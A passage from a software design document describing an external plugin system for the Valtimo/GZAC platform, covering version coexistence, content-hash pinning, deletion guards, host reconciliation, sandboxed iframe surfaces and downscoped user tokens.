`description` fields. Every declared locale must carry both, enforced once by `validatePluginManifest`
at pack-time and upload-time (§9).

- *Backend.* `ExternalPluginDiscoveryService.localizedManifestValue()` derives the denormalised
  `external_plugin_definition.name`/`description` columns from the `en` bucket (fallback: first
  declared locale). `DefinitionResponse` still exposes those columns **and** the full `manifest`
  (with `translations`), so the frontend can localise.
- *Frontend, single source of truth.* `@valtimo/plugin` exports `getExternalPluginName`,
  `getExternalPluginDescription`, and `getExternalPluginDisplayName` (name + `(version)`). They read
  `manifest.translations[lang]`, fall back to `en`, then the denormalised `definition.name`/
  `pluginId`. Every surface that renders an external plugin's name/description uses them and
  **reacts to language change** via `TranslateService.stream('key')` / `onLangChange`: the
  "Configure plugin" tile (`plugin-add-select`), the configurations list `pluginName` column
  (`plugin-management`), the process-link configuration picker (`select-plugin-configuration`), and
  the external edit-modal header (`plugin-external-edit-modal`). Switching the Angular UI between
  Dutch and English re-renders these labels live.

**CSP.** The main app's CSP `<meta>` tag is augmented at boot
(`projects/valtimo/security/.../initialize-csp.ts`) with the discovered host origins on
`frame-src` (iframe loading), `img-src` (logo loading), **and `connect-src`** (the parent-proxy's
cross-origin `POST .../data` fetch, §13.2/§13.5 — without it the call is blocked by
`connect-src 'self' …`, even though the iframe already loaded via `frame-src`). The bootstrap fetches
`GET /api/v1/external-plugin/host-origins` (`ExternalPluginHostOriginsResource` — a non-management,
`.authenticated()` endpoint, because every user who renders a plugin tab, task form or page needs
the origins, and it returns only the distinct `scheme://host[:port]` origins of the registered
hosts — no admin tokens, broker URLs or configuration data) and passes the origins into the
initializer before the meta tag is inserted (the CSP meta is immutable once parsed).

## 11. Multi-version support, compatibility & content integrity ✅ (side-by-side versions, compatibility check, pinned packages & confirmed overwrites)

**Why coexistence matters.** Once a case definition becomes *final*, its BPMN — including any
service tasks bound to an external-plugin action — is immutable. A process link cannot then be
edited, and therefore cannot be moved to a newer version of the same plugin. New work happens on
a new case definition, which is free to bind to a newer plugin version. This means **multiple
versions of the same plugin must run side-by-side indefinitely**: there is no path of
"deprecating" an old version while final case definitions still reference it.

**What works.**
- `external_plugin_definition` has `UNIQUE(plugin_id, version)` so v1 and v2 of the same plugin
  coexist as separate rows.
- The host loads each `(pluginId, version)` as a distinct Wasm module.
- A `Configuration` references one specific `definition_id` → pinned to one version.
- A **`FIXED`** `ProcessLink` references one specific configuration → pinned to one version
  transitively. The link additionally records `pluginId`/version on the shared reference columns
  (`plugin_definition_key` / `plugin_definition_version`) as design-time metadata — the runtime
  call always uses the resolved configuration's definition version, so the two can never diverge
  at invocation time.
- A **`BUILDING_BLOCK`** `ProcessLink` (§19) carries no configuration id — only the
  `pluginId@version` reference. The concrete configuration is supplied per usage context through
  the building block's `pluginConfigurationMappings`, keyed `external-plugin:<pluginId>@<version>`,
  so each case definition using the block pins its own configuration (and thereby version).

**Operator flow for adding a new version (no upgrade required).**
1. Plugin author publishes v2 to the host alongside v1.
2. GZAC discovers both versions and lists them as separate entries in the "Configure plugin"
   modal.
3. Admin activates a **new v2 configuration** alongside any v1 configurations that are still in
   use.
4. New BPMNs / case definitions bind their service tasks to the v2 configuration; existing final
   case definitions continue to reference their v1 configuration.

**Content pinning & confirmed overwrites ✅.** A published version is the exact bytes the admin's
acceptance covers, and a version is **never replaced silently**: a re-upload of an already-known
`pluginId@version` is refused by default, an identical re-upload is a friendly no-op, and
replacing a version with *different* content requires the admin to re-review the package's
requested permissions and explicitly confirm the overwrite. Content-change detection on the
discovery side exists to catch tampering and out-of-band modification of a host's package — a
change that arrives without the confirmed-overwrite flow is treated as an incident:

- *Host — no silent replacement.* Every loaded package has a `contentHash`: `sha256:` over every
  file in the version directory (`manifest.json`, `plugin.wasm`, the logo, `frontend/**`), each
  record bound to its relative path and byte length so files cannot be renamed or shuffled
  without changing the hash. The hash is exposed in the plugin listing and the upload response.
  An upload naming an existing `pluginId@version` — loaded *or* on disk — is refused with 409
  (§7) carrying `code: PLUGIN_VERSION_EXISTS` plus the loaded and uploaded packages' hashes;
  only an explicit `overwrite=true` replaces the package. The reported hash is always the hash of
  the **exact stored package**: the upload is staged, hashed, and swapped into place by renaming
  the version directory, so the reported value can never cover a half-written directory or a
  concurrent upload's bytes. Because a replaced version's directory is replaced *wholesale*, files
  from a previous package can no longer survive into the hash or keep being served — an overwrite
  that drops a frontend bundle really drops it.
- *Confirmed overwrite — permission re-review, re-pin, re-grant.* GZAC enriches the
  version-exists 409 with the uploaded manifest's requested endpoint/event/capability sets
  (parsed server-side from the zip by `PluginPackageInspector.readManifest`). The upload modal
  branches on the hashes: identical content shows an "already up to date" info; different
  content opens a review dialog — a warning that the overwrite can lead to unexpected behavior
  for anything already using the version, the full requested-permission list (the same
  `plugin-external-permissions` acceptance component used at activation, including its
  acknowledgement checkbox) and a danger-styled confirm. Confirming re-issues the upload with
  `overwrite=true`; on the host's 201, GZAC pins the new content hash (clearing any pending
  flag) and re-grants **every configuration of the definition to exactly the new declared
  sets** (`ExternalPluginConfigurationService.applyApprovedOverwrite`) — the same all-or-nothing
  footprint activation grants — after which the immediate re-discovery refreshes the stored
  manifest and pushes the new grants and a fresh token.
- *GZAC — pinning at discovery.* The definition stores the hash the host served when the plugin
  was first discovered (`content_hash` — trust on first use, the same moment the definition
  becomes configurable). Every later poll compares the discovered hash against the pinned one; a
  difference sets `pending_content_hash` (surfaced as `requiresReacceptance` on the definition
  DTO) and leaves the stored manifest/schema **frozen at the accepted state**.
- *While flagged, the plugin is dark on every surface:* configuration pushes are withheld
  (`pushToHost` refuses — §8.2 — so the host's last service token expires within its 10-minute
  TTL), process-link actions fail with `EXTERNAL_PLUGIN_CONTENT_CHANGED`, task-form submissions
  are refused with a user-visible error, and user tokens are not minted (409 — §13.3). Every push
  additionally carries `expectedContentHash`, which the host verifies against its loaded package
  (409 on mismatch), closing the window between GZAC's discovery cycle and the push.
- *Recovery is a deliberate, API-only administrative act.* `POST
  /api/management/v1/external-plugin/definition/{id}/accept-content` (ADMIN) re-pins after an
  operator has investigated the change: the request echoes the exact pending hash under review —
  acceptance of a *specific* package, so a stale echo is rejected when the host has changed yet
  again — and an immediate re-discovery then refreshes the manifest data and resumes pushes.
  There is **no management-UI flow for this by design**: a changed package under a pinned version
  that did *not* come through the confirmed-overwrite flow is an incident-recovery path, not a
  routine operation (the routine paths for changed content are a new version or the confirmed
  overwrite above), so it stays a conscious API call rather than a button. A host serving the
  pinned bytes again (a rollback) clears the flag automatically on the next poll. A host whose
  listing carries no hash is simply not pinned.

**✅ Version visibility in the UI.** The version appears in brackets after the localised plugin
name (`Name (X.Y.Z)`) wherever that name is rendered, via `getExternalPluginDisplayName` (§10), so
coexisting versions stay distinguishable:
- The "Configure plugin" modal tile (`plugin-add-select`) — `Name (X.Y.Z)` plus the description.
- The configurations overview list `pluginName` column (`plugin-management`).
- The process-link configuration picker (`select-plugin-configuration`) — so the BPMN author knows
  which version they're binding to.
- The configuration edit-modal header (`plugin-external-edit-modal`) — `{configTitle} - Name (X.Y.Z)`.

All four recompute on language change (the version suffix rides along with the localised name).

**Compatibility check ✅.** A plugin declares the GZAC version range it targets in its manifest:

```json
"compatibility": { "minGzacVersion": "12.0.0", "maxGzacVersion": "12.1.0" }
```

Both bounds are optional and inclusive. GZAC compares the range against its own running version and
**warns** on a mismatch; it never hard-blocks activation. One comparator backs two entry points:

- *Comparator* (`compatibility/GzacCompatibilityChecker.kt`) parses both bounds and the current
  version as semver (`org.semver4j.Semver`) and returns
  `CompatibilityResult(compatible, currentGzacVersion, minGzacVersion, maxGzacVersion, status)` with
  `status ∈ {COMPATIBLE, BELOW_MINIMUM, ABOVE_MAXIMUM, CURRENT_VERSION_UNKNOWN}`. Lenient by design:
  an absent or unparseable bound is not enforced, and an undeterminable current version yields
  `compatible = true` (`CURRENT_VERSION_UNKNOWN`) so noisy version metadata never raises a false
  warning.
- *Running version* (`compatibility/DefaultGzacVersionProvider.kt`, behind the `GzacVersionProvider`
  fun-interface) resolves in precedence order: (1) the `valtimo.external-plugin.gzac-version`
  property (operator override, useful in tests or when the build metadata is absent/wrong), (2) the
  Valtimo library version — the `Implementation-Version` stamped on every Valtimo module's jar
  manifest (`backend/build.gradle` sets it to `projectVersion` for all subprojects). This is the
  canonical source because a plugin's `compatibility` range targets the Valtimo *platform*, not the
  wrapping application: it is the same value the UI sidebar shows for the backend (read by
  `com.ritense.valtimo.web.rest.VersionResource` off a core-module class) and stays correct even when
  Valtimo is embedded in a downstream app whose own build version differs. The autoconfiguration
  reads it from `DefaultGzacVersionProvider`'s own package, which carries that manifest version.
  `null` when neither resolves (e.g. a dev run from class directories with no jar manifest), which the
  comparator treats as "cannot judge".

Two places run it:

- **Listing / detail** — `ExternalPluginManagementResource.toDefinitionResponse()` checks each
  definition's stored `min_gzac_version` / `max_gzac_version` columns (populated at discovery from
  the manifest) and folds the outcome into `DefinitionResponse` (`minGzacVersion`, `maxGzacVersion`,
  `currentGzacVersion`, `compatible`). Informational only — an incompatible definition still lists
  and still activates.
- **Upload** — `POST …/host/{hostId}/upload` takes a `force` flag (default `false`). With
  `force=false`, `compatibility/PluginPackageInspector.kt` peeks the `compatibility` block straight
  from the uploaded `.zip`'s `manifest.json` (the definition row does not exist yet — discovery runs
  only after a successful upload), and an incompatible plugin is refused with **`409 Conflict`**
  carrying `{incompatible, compatible, currentGzacVersion, minGzacVersion, maxGzacVersion}`; the host
  is never contacted and discovery never runs. With `force=true` the upload proceeds regardless. The
  inspector is resilient — a missing manifest, missing `compatibility` block, or any parse failure
  yields no gate, and the manifest read is capped at 1 MB.

The frontend surfaces incompatibility as a **non-blocking** warning, localised via
`pluginManagement.compatibility.*` (`en`/`nl`) through one message builder
(`plugin-management/.../utils/external-plugin-compatibility.util.ts`), gated solely on
`compatible === false` (`isExternalPluginDefinitionIncompatible()`):
- the configurations table (`plugin-management.component`) shows an "Incompatible" tag with an
  info-tooltip on each external row whose definition is incompatible;
- the configure step (`plugin-add-modal.component`) shows `incompatibleWarning$` for an incompatible
  selection, recomputed on language change;
- the upload modal (`plugin-upload-modal.component`) handles every `409` itself (kept off the
  global error toast by the `X-Skip-Interceptor: 409` request header), branching on the response
  body: a compatibility rejection (`incompatible: true`) becomes an "Upload an incompatible
  plugin?" confirmation that re-issues the upload with `force=true`; `code:
  PLUGIN_VERSION_EXISTS` opens the overwrite-review dialog (or the identical-content info — see
  the content-pinning section above); any other rejection relayed from the host becomes a
  localised inline error in the modal with the host's own detail. The overwrite confirm retries
  with `force=true` as well, because compatibility was already checked (or explicitly forced) on
  the attempt that produced the version-exists 409.

**⛔ Other gaps.** Schema migration for moving a configuration from v1 to v2 is not implemented
and arguably unnecessary given the side-by-side model (a published version's bytes never change
without an explicit admin-confirmed overwrite — see content pinning above). Permission-diff
prompts and a
`LATEST/STABLE/DEPRECATED` channel status are open. The compatibility range is a warning rather than
an activation gate — only upload is a confirm-gate; an admin can still activate a configuration for
an incompatible definition.

## 12. Deletion semantics — strict, never forced ✅

Deletion of a host or a plugin configuration is **never allowed** while any process link in the
system references that configuration — even when the case definition that owns the BPMN is final
and the link is therefore frozen. The same guard covers both **external** plugin configurations /
hosts and **embedded** (`com.ritense.plugin`) configurations.

Rationale: a forced cascade would silently break a final case definition's runtime behaviour. The
configuration is immutable for the same reason the BPMN that references it is immutable. The user
experience is to surface what depends on the resource and explain that deletion is unavailable —
there is no force override on any path.

| Entity | Blocked when… | Surface |
|--------|---------------|---------|
| **ProcessLink** | never (BPMN authoring is the source of truth — the case definition is the gate) | — |
| **Configuration** (external) | any *fixed* `ProcessLink` (a `BUILDING_BLOCK` reference carries no configuration id and never blocks, §19), any `EXTERNAL_PLUGIN` case tab, **or** any `external-plugin` case widget references it | Server-side guard in `ExternalPluginConfigurationService.delete` throws `ExternalPluginConfigurationInUseException` (HTTP 409, `usages` payload). `ExternalPluginHostUsageResolver` folds in process-link usages, case-tab usages (via `CaseExternalPluginTabService.findUsagesForConfiguration`, §13.1) **and** case-widget usages (via `CaseExternalPluginWidgetService.findUsagesForConfiguration`, §13.7). UI runs the pre-check and shows the read-only `PluginUsageModalComponent`, which renders all row kinds. No override. |
| **Configuration** (embedded) | any *fixed* `PluginProcessLink` references it | Server-side guard in `PluginService.deletePluginConfiguration` throws `PluginConfigurationInUseException` (HTTP 409, `usages` payload). Same UI flow and modal. |
| **Definition** | any `Configuration` exists for it | Not directly user-deletable; cleared by the discovery cycle when the upstream host no longer lists the version **and** no configurations remain. |
| **Host** | any `Configuration` under any definition on this host has at least one *fixed* `ProcessLink` referencing it | Server-side guard in `ExternalPluginHostService.delete` throws `ExternalPluginHostInUseException` (HTTP 409, `usages` payload). Host delete in the UI shows the same `PluginUsageModalComponent`. Deletion of an entire host with active configurations remains blocked: removing the host would orphan service tokens, push paths, and broker bindings for live configurations. |
| **Plugin on host** (host-side route) ✅ | active config refers to plugin version | `DELETE /api/host/plugins/:id/:version` returns HTTP 409 with `configurationIds`. |

A configuration that *has* been activated but has no process links yet **can** be deleted (it is
not yet load-bearing). A host without any configurations can be deleted. Discovery cleanup
continues to mark missing definitions `UNAVAILABLE` after N consecutive misses
(`failure-threshold`, default 3) rather than deleting them.

**12.1 Shared usage infrastructure (core plugin module).** The guard reuses one set of types and
one process-definition reader across both plugin systems, all living in the **core** `plugin`
module (`backend/plugin`, which now depends on `:backend:core` for the Operaton lookups). External
code imports them rather than redefining them:

- `web/rest/dto/PluginUsageDto` + `PluginUsageParentType` (`CASE | BUILDING_BLOCK | GLOBAL`) — the
  single DTO shape returned in the 409 payloads and `/usages` responses. Carries
  `configurationId`, `configurationTitle`, `parentType`, `parentKey`, `parentVersionTag`, and — for a
  **process-link** usage — `processDefinitionId`, `processDefinitionKey`, `processDefinitionName`,
  `activityId`, `activityName`, `processLinkId` (all now **nullable**). For an **external-plugin
  case-tab** usage those process fields are null and `tabKey`/`tabName` are populated instead
  (`parentType = CASE`). The frontend `ExternalPluginHostUsage` model and `PluginUsageModalComponent`
  were widened to render either kind.
- `service/ProcessDefinitionUsageMetaResolver` — resolves a process definition's key/name, the
  owning **case definition or building block** (parsed from the Operaton `versionTag` via
  `OperatonProcessDefinition.getBlueprintId()`, widened into `PluginUsageParentType`), and lazily
  the BPMN model so the **activity name** can be looked up. All Operaton/BPMN reads are wrapped in
  `runCatching`, so a missing or unloadable process definition degrades to nullable fields
  (`GLOBAL` + null key/version) — the row still surfaces with `processDefinitionId` and the link id
  for manual investigation.

Two thin usage resolvers sit on top of it:
- `PluginConfigurationUsageResolver` (core) — one `PluginUsageDto` per *fixed* `PluginProcessLink`
  referencing the configuration. **BUILDING_BLOCK references resolve dynamically per
  building-block context and are stored with `plugin_configuration_id = NULL`**, so they are
  correctly excluded by `findByPluginConfigurationId` — only fixed references block deletion of a
  specific configuration.
- `ExternalPluginHostUsageResolver` (external-plugin module) — `findUsagesForConfiguration(id)` and
  `findUsagesForHost(id)` (the host variant fans out over every definition→configuration under the
  host), via `ExternalPluginProcessLinkRepository.findAllByExternalPluginConfigurationIdIn(...)`.

**12.2 Exceptions.** Three `AbstractThrowableProblem`s, all HTTP 409 `application/problem+json`
with `getCause() = null` (so no stack leaks into the body) and a `parameters` map rendered as
top-level keys: `PluginConfigurationInUseException` (core, `configurationId` + `usages`),
`ExternalPluginConfigurationInUseException` (`configurationId` + `usages`), and
`ExternalPluginHostInUseException` (`hostId` + `usages`). Not-found lookups (a configuration,
definition or host by id) throw `ExternalPluginNotFoundException` from the same Zalando Problem
family — HTTP **404** `application/problem+json`, again with `getCause() = null` — instead of
surfacing as a 500.

**12.3 Advisory `/usages` endpoints (proactive UI).** Each delete is preceded by a read-only
lookup so the UI can disable / divert the delete control before the user commits, returning the
same `List<PluginUsageDto>` the 409 would carry. All three are `ADMIN`-gated in their respective
`HttpSecurityConfigurer`s:
- `GET /api/v1/plugin/configuration/{id}/usages` (embedded);
- `GET /api/management/v1/external-plugin/configuration/{id}/usages`;
- `GET /api/management/v1/external-plugin/host/{hostId}/usages`.

These are **advisory only** — the server-side guard in the `delete` methods remains authoritative.
An empty list here does not authorise deletion: a process link created between the pre-check and
the delete still surfaces the 409, which the UI also handles.

**12.4 Frontend flow.** `@valtimo/plugin` exports the `ExternalPluginHostUsage` /
`ExternalPluginHostUsageParentType` types (mirroring the DTO) and the
`getHostUsages` / `getConfigurationUsages` service calls (`ExternalPluginService`), with
`PluginManagementService.getConfigurationUsages` for embedded configs. `PluginManagementComponent`
runs one unified `_requestDeleteConfiguration(source, id, title)` entry point for every delete
trigger (row action, external edit modal's `onExternalConfigDeleted`, embedded edit modal's
bubbled `deleteEvent`): it pre-checks usages, then routes to either the read-only in-use modal
(blocked) or a destructive-confirmation modal (clear); the actual delete still catches a 409 and
re-opens the in-use modal to cover the race. The embedded `PluginEditModalComponent` no longer
deletes inline — it emits `deleteEvent` up to the parent so the pre-check + confirmation flow lives
in one place (matching the external edit modal). `PluginUsageModalComponent` is a single read-only,
"Close"-only modal reused for hosts and configurations; the parent supplies the title/description
translation keys. i18n lives under `pluginManagement.{deleteConfigurationModal, hostInUseModal,
configurationInUseModal, usageModal}` in `en.json` / `nl.json`.

**12.5 Host-side reconciliation & ownership ✅.** Discovery re-pushes every configuration each
cycle but, before this, never *removed* host-side configurations GZAC no longer has — a config
deleted while its host was down (the after-commit `deleteConfiguration` call is best-effort, no
retry) stayed in the host's database indefinitely. Two mechanisms close this:

- **Ownership.** Every push carries `ownerId` — the GZAC-side **host-row UUID**
  (`ExternalPluginHost.id`), i.e. the identity of the GZAC↔host *relationship*. The host persists
  it (`owner_id TEXT NULL`, migration 8) as an opaque token and echoes it in
  `GET /api/host/configurations`, which now returns **redacted summaries**
  (`{configurationId, pluginId, pluginVersion, ownerId}`) instead of full configs — a host serves
  many GZAC instances, and the old full-fat listing handed every `ADMIN_TOKEN` holder the service
  tokens / decrypted properties / broker credentials of *other* instances. `HOST_ID` (the host's
  own event-queue identity) deliberately plays no role: it identifies the host, not the pusher.
  Since discovery re-pushes everything each cycle, live configs self-claim within one healthy
  cycle — no data migration. The host warns when a push *changes* an owner: the fingerprint of two
  environments (typically DB clones) pushing the same configuration id.
- **Reconciliation pass** (`ExternalPluginDiscoveryService.reconcileConfigurations`). Each poll
  fetches the host's configuration listing, then reads the local set, and deletes host entries
  that carry **this GZAC's ownerId** but are absent locally. Never deleted: entries owned by
  another GZAC, unowned entries (`ownerId` null — pre-ownership pushers; claimed on their owner's
  next push, or cleaned manually), and anything when the listing is unavailable. Correctness
  invariant: the host snapshot is fetched *before* the local read, so a concurrently created
  config is absent from the snapshot (never a candidate) and a concurrently deleted one is still
  in the local set (pruned next cycle); config ids are GZAC-generated UUIDs and never reused.
  Parsing is strict (`ExternalPluginHostClient.listConfigurations`): 404/405 → `null` → skip the
  pass (older hosts / minimal apps keep working); any other failure or a malformed body throws and
  fails the whole poll — deleting from a half-parsed listing could nuke live configs. Deletes are
  idempotent (a 404 on DELETE counts as success) and a failed delete is retried next cycle.
  Ownership scoping is a *safety* mechanism, not authorization — all `ADMIN_TOKEN` holders are
  mutually trusted; the host does not enforce owners on DELETE (that would break legacy-row and
  older-GZAC cleanup).
- **Status semantics.** `CONNECTED` previously flipped on a bare `/health` 200 *before* anything
  else, and post-probe failures never touched the failure counter — a host with a wrong admin
  token stayed `CONNECTED` forever. Now the flip happens only at the end of a fully successful
  poll (health + authenticated plugin and configuration listings fetched, reconcile + pushes run),
  and a state-fetch failure counts toward the same `failure-threshold` as an unreachable host. No
  new enum value: "pings but unusable" surfaces as `UNREACHABLE` (deliberate — zero frontend/i18n
  impact; per-config push failures still don't fail the poll, they self-heal next cycle).
- **Host deletion cleanup.** `ExternalPluginHostService.delete` now best-effort-deletes every
  pushed config from the host after the local cascade commits — once the host row is gone GZAC
  never polls the host again, so reconciliation could never prune these. If the host is down at
  that moment the rows remain until cleaned manually (accepted residual; a host-side
  stale-owner TTL GC was considered and rejected — it would delete configs of a legitimately
  long-down GZAC).

Version-skew is safe in every combination: old GZAC × new host → rows stay unowned, nobody deletes
them; new GZAC × old host → no listing, reconciliation skipped; the mechanism only fully engages
when both sides are current. Operational rule (README'd): never point a database-cloned GZAC
environment at the same host as its source — clones share host-row UUIDs and configuration ids and
will fight over the same rows.

## 13. Iframe surfaces & user-scoped access ✅ (case tab, task form, menu page, case widget)

A plugin's iframe surfaces need to call GZAC **on behalf of the logged-in user** (respect what the
user can see/do), and the plugin **backend** may call GZAC either as the user or as the system.
Three iframe surfaces exist — the **case-detail tab** (§13.1), the **task form** (§13.6) and the
routed **menu page** (`ExternalPluginMenuPageService` ↔ `ExternalPluginPageComponent`); case
widgets remain ⛔. The iframe holds **no token** and routes calls through the Angular parent
(the **parent-proxy** model, §13.2) rather than being handed the token via `init`.

### 13.1 Case-tab surface (`EXTERNAL_PLUGIN` tab type) ✅

- New `CaseTabType.EXTERNAL_PLUGIN` (`@JsonValue` → `external_plugin`); 15 chars fit
  `case_tab.type varchar(20)`, **no DDL change** to that column.
- Side table `case_external_plugin_tab` — composite PK `(case_definition_key,
  case_definition_version_tag, tab_key)`, FK → `case_tab(...)` `ON DELETE CASCADE`, plus
  `external_plugin_configuration_id uuid not null` and nullable `bundle_key`. DDL lives in the core
  **release** changelog `backend/core/.../liquibase/13-32-0/20260622-add-case-external-plugin-tab.xml`
  (registered in `13-32-0-master.xml`), **not** in `initial-setup` — new changesets go in the
  current release folder.
- `CaseExternalPluginTabService` creates the side row on `CaseTabCreatedEvent` when
  `type == EXTERNAL_PLUGIN`; the configuration id + optional bundle key are parsed from the generic
  `contentKey` (`"<configId>[:<bundleKey>]"`), so the create path is untouched (mirrors WIDGETS) and
  **duplicate-on-copy is automatic** — the create event reconstructs the side row, no listener branch
  needed.
- Content endpoint `GET /api/v1/document/{documentId}/external-plugin-tab/{tabKey}` —
  USER-gated in `CaseHttpSecurityConfigurer` (mirroring `widget-tab`; a missing matcher would 403 by
  deny-by-default), runs the WIDGETS PBAC pattern (`CaseTab` VIEW with document context) and returns
  `{ bundleUrl, configurationId, bundleKey, context }` where
  `context = { documentId, caseDefinitionKey, caseDefinitionVersionTag, pluginConfigurationId }`.
- The bundle URL is resolved through a **one-directional SPI**: `ExternalPluginCaseTabResolver`
  (declared in `case`, consumed as `Optional` so case builds without external-plugin) implemented by
  `ExternalPluginCaseTabResolverImpl` in `external-plugin` (which now compile-depends on
  `:backend:case`, no cycle) → `${definition.baseUrl}/${definition.version}${bundle.path}` for the
  manifest's `case-tab` bundle (by `key`, or the sole one).
- **Admin UX** (`@valtimo/case-management`): "External plugin" in the add-tab type picker, disabled
  when no activated configuration exposes a `case-tab` bundle; an inline content selector lists
  activated configs' `case-tab` bundles (bundle-title suffix when a plugin ships more than one) and
  writes the `contentKey`. Tab dispatch (`@valtimo/case`) maps `ApiTabType.EXTERNAL_PLUGIN` to
  `CaseDetailExternalPluginTabComponent`, which loads the content endpoint, starts a token session
  via the shared `ExternalPluginSessionService` (§13.3), and renders
  `<valtimo-external-plugin-iframe>` with the session's token and granted-endpoint allowlist.

### 13.2 Parent-proxy transport — the iframe holds no token ✅

The iframe is never handed a token via `init` and never fetches with a credential itself. It is
rendered at an **opaque origin**
(`sandbox="allow-scripts allow-forms"`, *without* `allow-same-origin`; `allow-forms` lets a task-form
submit through an idiomatic `<form>` — §13.6 — and does not affect origin isolation) and never holds a
credential:

- The bundle calls `sdk.callValtimo(method, path, body?)` or `sdk.getPluginData(path)`; the frontend
  SDK emits a correlation-id-keyed `proxyRequest` postMessage to the Angular parent and awaits a
  `proxyResponse`.
- `ExternalPluginIframeComponent` performs the call and posts back the **data only**. For GZAC
  (`target:"gzac"`) it uses a **raw `fetch`** (not Angular `HttpClient`, so the Keycloak bearer
  interceptor never attaches the full Keycloak token — a confused-deputy guard) with the downscoped
  user token over a same-origin relative `/api/...` path (**zero CORS**). For plugin data
  (`target:"plugin"`) it POSTs to the host `/data` route (cross-origin; the host serves
  `Access-Control-Allow-Origin: *`), forwarding the `configurationId` the host's `frontend_data`
  gate checks **and the downscoped user token the host introspects against GZAC before executing
  Wasm** (§13.5); when no user token is available (not yet minted, or the mint failed) the parent
  answers the proxy request locally with a 401 instead of calling the host.
- The iframe-supplied path of a GZAC proxy call is **untrusted**: the parent resolves it against
  `window.location.origin` and hard-requires the result to stay **same-origin** — rejecting
  absolute URLs to other origins, protocol-relative `//host/...` forms and non-http schemes like
  `javascript:` — and to sit **under the GZAC API base path** (derived from
  `valtimoApi.endpointUri`, fallback `/api/`) before the bearer token is attached. A compromised
  bundle can therefore never point the fetch (and thus the token) at a foreign host or a non-API
  route. On top of these hard guarantees sits a client-side **allowlist precheck** against the
  configuration's granted endpoints (`allowedEndpoints`, supplied by the mint response — §13.3):
  `undefined` means no allowlist was provided and the precheck is skipped (origin/prefix guards
  and the server-side allowlist remain authoritative); an **empty array denies every call** — an
  empty allowlist is never treated as "allow all".
- The `bundleUrl` itself is only trusted as an iframe `src` when it parses to an `http:`/`https:`
  URL — anything else (`javascript:`, `data:`, malformed) is silently ignored and the iframe stays
  unrendered.
- Inbound messages are validated by `event.source === iframe.contentWindow` (an opaque-origin iframe
  reports `event.origin === "null"`); the token never enters a postMessage. Inside the iframe the
  SDK applies the mirror-image guard: it pins the parent origin and ignores messages from any
  other origin (§9).
- **Why opaque-origin matters for escalation:** a same-origin (`allow-same-origin`) iframe could read
  the GZAC app's session / full Keycloak token and escalate beyond the allowlist. The opaque origin
  forecloses that, and is the reason the parent-proxy is used even when token *confidentiality*
  is not a concern.
- **The sandbox stops escalation; the bundle CSP stops exfiltration.** The host serves every
  bundle (and the logo) with a strict `Content-Security-Policy` — `default-src 'none'`,
  `script-src 'self'`, `connect-src 'self'`, `form-action 'self'`, … (§7) — so a hostile bundle
  cannot ship the data it legitimately receives through the parent-proxy off to a third party via
  `fetch` (opaque-origin requests go out as `Origin: null`, which many endpoints accept), remote
  script, pixel beacons or native form posts. The two mechanisms are complementary halves of the
  iframe containment story.

### 13.3 Downscoped user token ✅

- **Mint endpoint** `POST /api/v1/external-plugin/configuration/{configurationId}/user-token` —
  deliberately **non-management** and **not ADMIN-gated** (any authenticated user; the result is
  always bounded by PBAC ∩ allowlist). Explicitly whitelisted `.authenticated()` in
  `ExternalPluginHttpSecurityConfigurer`. Reads the current user via
  `SecurityUtils.getCurrentUserLogin()/getCurrentUserRoles()`, loads the configuration (404 when
  unknown; **409 while the definition's package content awaits re-acceptance — §11 — so the iframe
  surface stays dark for a changed plugin**), stamps the configuration's current
  `token_generation` into the token, and returns `{ userToken, expiresAt, grantedEndpoints }` —
  the configuration's granted endpoints ride along so the iframe parent can seed its client-side
  allowlist precheck (§13.2) without a second call. (Plugin tokens themselves can never call this
  endpoint — it sits on the hard denylist, §3.4.)
- **Introspection endpoint** `GET /api/v1/external-plugin/user-token/introspect`
  (`ExternalPluginUserTokenIntrospectionResource`) — the plugin host's validation counterpart:
  the host presents a user token as the bearer credential and receives the token's own claims,
  `{ subject, configurationId, expiresAt }`, with 200. The user-token filter authenticates the
  token; the resource rejects any other principal (a Keycloak user, a service token) with 403 —
  introspection is only meaningful for user tokens. Registered `.authenticated()` in
  `ExternalPluginHttpSecurityConfigurer` and reachable for user-token principals through the
  narrow denylist carve-out (§3.4). The host calls it before executing Wasm for `/data` (§13.5).
- **Token** (`ExternalPluginUserTokenService`): HS256, `sub=userLogin`, custom `roles` claim,
  `plugin_config_id`, `token_generation` (the configuration's revocation counter — the user-token
  authenticator applies the same generation check as the service-token path, §3.6, so revoking a
  configuration's tokens kills its outstanding user tokens too, including their use against the
  introspection endpoint below), `type=external_plugin_user`, `iss=valtimo-gzac`, `iat`, `exp`.
  TTL from `valtimo.external-plugin.user-token.ttl`, **hard-capped at 15 minutes**. Signed with
  its **own** domain-separated key, `SHA-256(valtimo.plugin.encryption-secret + "|user")`
  (`ExternalPluginUserTokenKeyProvider`, on the shared key-provider base — §3.2): a user token can
  never validate against the service-token parser or vice versa, so the `type` claim is a routing
  hint, not the security boundary.
- **Session ownership** (`@valtimo/plugin` `ExternalPluginSessionService`): all three hosting
  surfaces — case tab (§13.1), task form (§13.6) and routed page — share one page-scoped service
  that mints the token, re-mints it 60 s before expiry, and retries failed re-mints with capped
  exponential backoff (5 s → 10 s → … ≤ 60 s) instead of letting the session die silently. It
  exposes the token, its expiry and the mint response's granted endpoints as signals the surface
  binds to the iframe component; each surface provides its own instance so parallel surfaces never
  share token state. The shared `derivePluginDataUrl` util derives the host `/data` URL from the
  bundle URL for all three surfaces.
- **Recognition** (`ExternalPluginUserTokenFilter`, before `BearerTokenAuthenticationFilter` in
  `ExternalPluginCallbackHttpSecurityConfigurer`): sets an `ExternalPluginUserPrincipal`, strips the
  `Authorization` header, and — the **one critical divergence** from the service-token filter — does
  **NOT** `runWithoutAuthorization`. PBAC stays fully active.
- **Principal** `ExternalPluginUserPrincipal(userLogin, roles, pluginConfigId) : UserDetails` —
  **not** a `SystemPrincipal`. `getUsername()` = the user login (so `getCurrentUserLogin()` and PBAC
  conditions referencing the current user behave as for a Keycloak session); authorities = the token
  roles (so `getCurrentUserRoles()` round-trips). Roles are frozen ≤15 min — no Keycloak round-trip.
- **Enforcement**: `ExternalPluginEndpointAllowlistFilter` extracts the `pluginConfigId` from
  **either** `ExternalPluginServicePrincipal` **or** `ExternalPluginUserPrincipal` and intersects with
  the configuration's granted endpoints. Net for the user token: **PBAC (enforced, not bypassed) ∩
  allowlist**.

### 13.4 Plugin backend, as the user (`gzacApi.asUser`) ✅

A `handle_request` handler can call GZAC **as the user** — not just as the system — via
`gzacApi.asUser.{get,post,put,delete}` (the existing `gzacApi.*` stays service-token). The parent
forwards the downscoped user token in the `/data` POST body; `callRequest` threads it through the
